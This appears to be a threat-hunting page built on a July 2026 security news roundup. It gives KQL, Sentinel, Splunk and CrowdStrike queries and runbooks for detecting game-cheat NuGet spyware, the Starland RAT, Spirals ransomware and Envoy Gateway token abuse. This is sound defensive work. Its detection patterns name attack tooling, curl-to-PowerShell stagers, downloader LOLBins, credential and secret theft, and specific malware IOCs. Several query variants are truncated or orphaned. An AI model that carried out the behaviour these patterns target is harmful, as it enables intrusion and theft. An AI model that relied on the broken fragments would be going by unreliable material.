Vulnerable Envoy Gateway version exposed to CVE-2026-53713 AIReconnaissance Medium
Inventory hunt that flags hosts/images running an Envoy Gateway version affected by CVE-2026-53713 (>=1.8.0-rc.0 <1.8.1, or <1.7.4) so the exploitable surface is remediated to >=1.7.4 / >=1.8.1 before an attacker submits a malicious EnvoyExtensionPolicy. Rationale: Uses the exact CVE id and the affected/fixed version ranges from the advisory (fixed >=1.7.4 and >=1.8.1). This is the only pivot expressible on Defender/Sentinel native telemetry since the attack itself lives in K8s audit logs; relies on container/software vuln assessment picking up the envoyproxy/gateway package. Cross-checked against: • https://github.com/advisories/GHSA-wcrf-9vrr-854f
ATT&CKT1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A patched version mis-fingerprinted by TVM as vulnerable (stale scan)
  • An image tag pinned to a fixed digest but labelled with an old version string
  • Non-production/lab Envoy Gateway flagged alongside prod
  • TVM not yet ingesting the CVE definition (false negative, not FP)
Response runbook
1) Triage: confirm the reported SoftwareVersion is genuinely <1.7.4 or in 1.8.0-rc.0..1.8.1 and that the instance accepts EnvoyExtensionPolicy submissions. 2) Contain: restrict RBAC so only trusted identities can create/patch EnvoyExtensionPolicy, and apply the Lua-docs Warning-section workarounds until patched. 3) Hunt: upgrade to >=1.7.4 / >=1.8.1 and retro-scan kube audit for prior exploit attempts against the affected cluster.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId == "CVE-2026-53713"
| project Timestamp, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by Timestamp desc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId == "CVE-2026-53713"
| project TimeGenerated, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by TimeGenerated desc
Envoy Gateway ServiceAccount token reuse for anomalous K8s API actions AIActions on Objectives Medium
Post-exploitation hunt: the envoy-gateway controller ServiceAccount (system:serviceaccount:envoy-gateway-system:envoy-gateway) performing actions it never legitimately performs — creating/deleting pods, exec/attach into pods, reading kube-system secrets, or touching cluster RBAC — which indicates the disclosed token is being replayed against the API server. Rationale: The advisory states the disclosed token can be used to 'read sensitive information from the K8s API Server'; the envoy-gateway controller SA legitimately manages EnvoyProxy infra in its own namespace but never execs into pods, reads kube-system secrets, or edits cluster RBAC — so those verbs under that identity are strong reuse signals. SA name/namespace confirmed from Envoy Gateway deployment docs. Cross-checked against: • https://github.com/advisories/GHSA-wcrf-9vrr-854f • https://gateway.envoyproxy.io/docs/tasks/operations/deployment-mode/
ATT&CKT1550.001 T1552.001
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Envoy Gateway upgrade/migration job temporarily granting the SA broader RBAC
  • A future controller version that legitimately reads a secret in a shared namespace
  • Cluster admin impersonating the SA for troubleshooting (kubectl --as)
  • Backup tooling running under the same SA reading secrets broadly
Suppression filter
| where UserAgent !startswith "envoy-gateway/"
Response runbook
1) Triage: for each hit compare sourceIPs and userAgent against the controller pod's normal client (in-cluster pod IP, controller userAgent); an external IP or kubectl/curl userAgent is high-confidence token theft. 2) Contain: rotate the envoy-gateway SA token immediately, cordon/quarantine any pods created by the SA, and review/revert RBAC changes. 3) Hunt: enumerate every action taken by the token since the disclosure event and check for new workloads, exfil connections, or additional credential reads.
AKSAudit
| where TimeGenerated > ago(7d)
| extend SubmitUser = tostring(User.username), Resource = tostring(ObjectRef.resource), NS = tostring(ObjectRef.namespace)
| where SubmitUser == "system:serviceaccount:envoy-gateway-system:envoy-gateway"
| where (Verb in ("create","delete") and Resource in ("pods","pods/exec","pods/attach"))
     or (Resource == "secrets" and NS == "kube-system")
     or (Resource in ("clusterrolebindings","rolebindings","clusterroles"))
| project TimeGenerated, SubmitUser, Verb, Resource, NS, ObjName=tostring(ObjectRef.name), UserAgent
| order by TimeGenerated desc

ThreatsDay: Game Cheat Spyware, 24-Hour Ransomware, Chrome Sync Stalking + 12 More Stories

The Hacker NewsBleepingComputerCisco Talos
2026-07-16 21 use cases 13 techniques 6 kill-chain phases detected

A lot of this week’s trouble starts with something that looks close enough. A familiar repo. A useful installer. A harmless sync setting. Then the handoff goes bad, the box starts talking to someone else, and the damage moves faster than the explanation. Old bugs are back, weak defaults are earning their keep, and some attack paths are so plain they barely feel like research. Here’s the mess.

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Spirals ransomware precursor: IIS worker (w3wp.exe) spawning shell from ASP.NET web shell · Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — ThreatsDay: Game Cheat Spyware, 24-Hour Ransomware, Chrome Sync Stalking + 12 Mo
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Game-cheat NuGet downloader fetches pepesoft.exe from pepegit666 GitHub/Hugging Face infra · Suspicious browser extension installation · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Starland RAT uses curl.exe to spawn PowerShell stager (WLDR agent decrypt/run) · Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Spirals ransomware bulk file-encryption burst (single process, high write/rename volume) · Infostealer — non-browser process accessing browser cookie/login DBs · Crypto-wallet file/keystore access by non-wallet process · Remote service execution — PsExec / SMB lateral movement · OAuth consent / suspicious app grant · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft)
Game-cheat NuGet downloader fetches pepesoft.exe from pepegit666 GitHub/Hugging Face infra AIInstallation High
Hunts the second-stage payload of the 11 malicious NuGet 'game cheat' packages: a .NET DotnetTool downloader that pulls and runs pepesoft.exe from GitHub Releases and Hugging Face paths under the actor username 'pepegit666'. Article-specific because it anchors on the concrete payload filename, the operator handle, and the two hosting services rather than generic .NET tooling. Rationale: Anchors on the exact payload filename pepesoft.exe and the operator handle pepegit666 plus the two named hosting services (GitHub Releases, Hugging Face) from the article — all confirmed by Socket's write-up, so hits are near-certain true positives. Cross-checked against: • https://socket.dev/blog/11-malicious-nuget-tools-pose-as-game-cheats • https://gbhackers.com/11-malicious-nuget-game-cheat-packages/ • https://cyberpress.org/nuget-packages-deploy-spyware/
ATT&CKT1204.002 T1105 T1071.001
Data sourcesEndpoint.Processes Endpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A security researcher detonating the pepesoft.exe sample in a sandbox VM
  • Malware-analysis or threat-intel tooling caching the sample under a pepegit666-referencing path
  • Blue-team purple-team exercise replaying the NuGet supply-chain sample
  • EDR quarantine copies retaining the original FileOriginUrl string
Suppression filter
| where not (DeviceName has_any ("SANDBOX","MALWARELAB","ANALYSIS"))
Response runbook
Step 1 (triage): Confirm the SHA256 of pepesoft.exe against VT/Socket; check whether a NuGet DotnetTool (dotnet.exe/.NET tool) was the parent that spawned or wrote it, and pull the FileOriginUrl to confirm the pepegit666 source. Step 2 (contain): Isolate the host, kill pepesoft.exe, and block the resolved GitHub/Hugging Face download IPs plus api.telegram.org egress. Step 3 (hunt): Enumerate all NuGet/dotnet tool installs on the host, sweep the org for the 11 package names and any dns.google DoH lookups immediately preceding github raw content connections (the campaign's DoH evasion).
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "pepesoft.exe"
   or FileOriginUrl has_any ("pepegit666","huggingface.co","github.com/pepegit666")
   or FileOriginReferrerUrl has "pepegit666"
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, ActionType, FileName, FolderPath, SHA256, FileOriginUrl, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "pepesoft.exe" or ActingProcessCommandLine has_any ("pepegit666","pepesoft.exe")
| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, TargetFileName, TargetFileSHA256, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Starland RAT uses curl.exe to spawn PowerShell stager (WLDR agent decrypt/run) AICommand & Control High
Detects UAT-11795's distinctive execution hand-off where the Python-based Starland RAT invokes curl.exe which in turn launches a PowerShell stager that decrypts and runs the in-memory WLDR C2 agent. curl.exe as the direct parent of PowerShell is rare and article-specific to this Russian-speaking financially-motivated campaign. Rationale: curl.exe directly spawning PowerShell is the article's named execution primitive for Starland RAT delivering WLDR — an uncommon parent/child pair confirmed by Cisco Talos, giving a low-FP, high-confidence pivot without relying on encoded-PowerShell heuristics. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/ • https://www.bleepingcomputer.com/news/security/russian-hackers-trojanize-webex-zoom-apps-to-push-starland-malware/
ATT&CKT1059.001 T1105 T1027
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A developer or CI script piping a downloaded PowerShell installer via curl (e.g. 'curl ... | powershell')
  • DevOps bootstrap tooling using curl to fetch and run a PS setup script
  • Chocolatey/winget-style install wrappers that call curl then PowerShell
  • Admin one-liners chaining curl and powershell for remote script retrieval
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("chocolatey","choco","winget","\\CI\\","azure-pipelines"))
Response runbook
Step 1 (triage): Capture both command lines — confirm whether the PowerShell child references a local encrypted blob/decrypt routine (WLDR stager) versus a benign remote installer URL, and check the grandparent for a trojanized installer name (MobaXterm, WebEx, Zoom, DBeaver, FaceIT). Step 2 (contain): Isolate the host and terminate the PowerShell process tree; snapshot memory to recover the in-memory WLDR agent before reboot. Step 3 (hunt): Look for encrypted C2 beaconing from powershell.exe, Remcos/CastleStealer artifacts, browser-credential and crypto-wallet access, and other hosts that ran the same trojanized installer hashes.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "curl.exe"
| where FileName in~ ("powershell.exe","pwsh.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where ParentProcessName endswith "\\curl.exe"
| where NewProcessName endswith "\\powershell.exe" or NewProcessName endswith "\\pwsh.exe"
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

Spirals ransomware precursor: IIS worker (w3wp.exe) spawning shell from ASP.NET web shell AIExploitation High
Detects the initial-access step of the Spirals ransomware intrusion: an internet-facing IIS server whose w3wp.exe worker process spawns command/PowerShell/recon binaries, the behavioural signature of the ASP.NET web shell the actor uploaded before establishing persistence and deploying ransomware within 24 hours. Rationale: The article states initial access was an ASP.NET web shell on an internet-facing IIS server; w3wp.exe spawning shells/recon is the direct host-side signature of that web shell and is anomalous on production IIS, giving a low-FP precursor to the sub-24h ransomware deployment. Cross-checked against: • https://thehackernews.com/2026/07/threatsday-game-cheat-spyware-24-hour.html
ATT&CKT1505.003 T1190 T1059.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A web app legitimately shelling out (e.g. a management portal running net user/whoami for diagnostics)
  • IIS-hosted monitoring/health-check scripts invoking cmd or PowerShell
  • Deployment tooling running under the app pool identity during a release
  • Admin troubleshooting an app pool via an interactive process under w3wp
Suppression filter
| where not (ProcessCommandLine has_any ("healthcheck","\\Deploy\\","appcmd list","telemetry"))
Response runbook
Step 1 (triage): Review the child command line and the IIS site/app-pool identity; pull recent DeviceFileEvents for newly-created .aspx/.asmx/.ashx files in the web root to locate the dropped web shell. Step 2 (contain): Take the IIS server offline or block inbound to the affected site, preserve the web shell file and IIS logs, and reset the app-pool and any credentials it can reach. Step 3 (hunt): Given the 24h ransomware timeline, immediately hunt for SAM hive dumps, endpoint-security uninstall events, PsExec staging, and mass file-encryption across hosts the server can reach.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "w3wp.exe"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","net.exe","net1.exe","whoami.exe","reg.exe","nltest.exe","systeminfo.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where ParentProcessName endswith "\\w3wp.exe"
| where NewProcessName has_any ("\\cmd.exe","\\powershell.exe","\\pwsh.exe","\\net.exe","\\net1.exe","\\whoami.exe","\\reg.exe","\\nltest.exe","\\systeminfo.exe")
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

id: c8a2f5d9-4b17-4e6c-9a03-1f7d6b2e8c40
description: Detects w3wp.exe spawning command-shell, PowerShell or reconnaissance binaries, indicative of an ASP.NET web shell such as the one used to gain initial access in the Spirals ransomware intrusion.

source:windows.sysmon @EventID:1 @ParentImage:(*\w3wp.exe OR *\W3WP.EXE) @Image:(*\cmd.exe OR *\CMD.EXE OR *\powershell.exe OR *\PowerShell.exe OR *\net.exe OR *\net1.exe OR *\whoami.exe OR *\reg.exe OR *\nltest.exe)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/w3wp\.exe$/i
| ImageFileName=/\\(cmd|powershell|pwsh|net|net1|whoami|reg|nltest|systeminfo)\.exe$/i
| groupBy([aid, ComputerName, CommandLine, ImageFileName], function=count())

Spirals ransomware bulk file-encryption burst (single process, high write/rename volume) AIActions on Objectives Medium
Behavioural impact detection for the Spirals Rust-based ransomware that encrypted the victim network within 24 hours: a single non-system process modifying/renaming/deleting thousands of files across many folders in a short window. Grounded in the article's explicit rapid network-wide encryption and same-day payload push. Rationale: Uses the article's explicit fact that Spirals pushed the payload network-wide and encrypted within 24 hours; since no ransom-note name or extension was published, the detection stays behavioural (per-process file-op burst) rather than inventing IOC strings. Cross-checked against: • https://thehackernews.com/2026/07/threatsday-game-cheat-spyware-24-hour.html
ATT&CKT1486 T1490 T1489
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Veeam/Commvault/backup agents performing large-scale snapshot or restore file operations
  • Disk-encryption rollout (BitLocker/third-party) touching many files at once
  • Bulk media transcoding, video rendering, or large software-build/CI artifact generation
  • Antivirus full-scan quarantining/renaming many files
  • Search-indexer or migration tooling rewriting large directory trees
Suppression filter
| where not (InitiatingProcessFileName in~ ("veeam.backup.shell.exe","commvault.exe","cvd.exe","MsMpEng.exe","SearchIndexer.exe","BackupAgent.exe"))
Response runbook
Step 1 (triage): Inspect the offending process image/path and a sample of touched files — check for new/changed file extensions or a ransom note dropped in the same folders; confirm the process isn't a known backup/encryption agent. Step 2 (contain): Network-isolate the host immediately, kill the process, and disable the account/PsExec path used to push it; preserve one encrypted sample and the note for keying. Step 3 (hunt): Sweep for the same binary hash across the fleet (PsExec-style fan-out), check for SAM dumps, endpoint-security uninstalls, VSS/shadow-copy deletion, and Tor connectivity referenced in the ransom workflow.
DeviceFileEvents
| where Timestamp > ago(1d)
| where ActionType in ("FileModified","FileRenamed","FileDeleted")
| where InitiatingProcessAccountName !endswith "$"
| summarize FileOps=count(), DistinctFolders=dcount(FolderPath), Start=min(Timestamp), End=max(Timestamp), SampleFiles=make_set(FileName, 10)
         by DeviceId, DeviceName, InitiatingProcessId, InitiatingProcessFileName, InitiatingProcessFolderPath, bin(Timestamp, 10m)
| where FileOps > 2000 and DistinctFolders > 20   // empirical mass-encryption burst threshold
| order by FileOps desc
ImFileEvent
| where TimeGenerated > ago(1d)
| where EventType in ("FileModified","FileRenamed","FileDeleted")
| summarize FileOps=count(), DistinctFolders=dcount(TargetFilePath), Start=min(TimeGenerated), End=max(TimeGenerated)
         by DvcHostname, ActingProcessId, ActingProcessName, bin(TimeGenerated, 10m)
| where FileOps > 2000 and DistinctFolders > 20   // mass-encryption burst threshold
| order by FileOps desc
source:windows.sysmon @EventID:11 -@Image:(*\System32\* OR *\system32\* OR *\Windows\SoftwareDistribution\*) -@Image:(*\MsMpEng.exe OR *\svchost.exe)
#event_simpleName=FileWritten
| ContextImageFileName!=/\\(System32|SysWOW64)\\/i
| groupBy([aid, ComputerName, ContextProcessId, ContextImageFileName], function=count(as=FileOps))
| FileOps > 2000
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count as FileOps dc(Filesystem.file_path) as DistinctFiles min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where (Filesystem.action=modified OR Filesystem.action=deleted OR Filesystem.action=created) by _time span=10m Filesystem.dest Filesystem.process_guid | `drop_dm_object_name(Filesystem)` | where FileOps > 2000 | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` | sort - FileOps
| tstats summariesonly=false count as FileOps dc(Filesystem.file_path) as DistinctFiles min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where (Filesystem.action=modified OR Filesystem.action=deleted OR Filesystem.action=created) by _time span=10m Filesystem.dest Filesystem.process_guid | `drop_dm_object_name(Filesystem)` | where FileOps > 2000 | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` | sort - FileOps
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-46817", "CVE-2023-4346")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-46817", "CVE-2023-4346")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

    [| tstats summariesonly=false earliest(_time) AS exec_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

    from datamodel=Email.All_Email

    [| tstats `summariesonly` count

          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]
| tstats summariesonly=false count

    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user

    [| tstats summariesonly=false count

Ransomware-style mass file rename / extension change Actions on Objectives Medium

Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents

| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host

| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc

The attack left 148 TfL systems inoperable and forced all 27,000 of the transport authority's employees into an office to get their passwords reset in person. Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha)
